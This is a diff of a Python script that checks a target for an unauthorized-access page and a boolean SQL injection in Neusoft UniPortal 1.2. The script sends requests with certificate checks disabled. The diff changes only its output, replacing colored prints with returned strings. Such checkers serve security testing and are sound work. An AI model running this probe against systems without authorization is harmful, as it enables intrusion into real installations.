@@ -9,8 +9,8 @@ description: 未授权访问页面：ecdomain/portal/survey/admin/SurveyStatis.j
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 from bs4 import BeautifulSoup
 
 class uniportal_bypass_priv_sqli_BaseVerify:
@@ -27,7 +27,7 @@ class uniportal_bypass_priv_sqli_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.status_code == 200 and r"<a href=SurveyStatisShow.jsp" in req.text:
-                cprint("[+]存在东软UniPortal1.2未授权访问漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在东软UniPortal1.2未授权访问漏洞...(高危)\tpayload: "+vulnurl
 
             soup = BeautifulSoup(req.text, "html.parser")
             html = soup.find_all("a")
@@ -40,12 +40,12 @@ class uniportal_bypass_priv_sqli_BaseVerify:
             req1 = requests.get(tureurl, headers=headers, timeout=10, verify=False)
             req2 = requests.get(falseurl, headers=headers, timeout=10, verify=False)
             if r"ShowText.jsp" in req1.text and r"ShowText.jsp" not in req2.text:
-                cprint("[+]存在东软UniPortal1.2 SQL注入漏洞...(高危)\tpayload: "+falseurl, "red")
+                return "[+]存在东软UniPortal1.2 SQL注入漏洞...(高危)\tpayload: "+falseurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = uniportal_bypass_priv_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
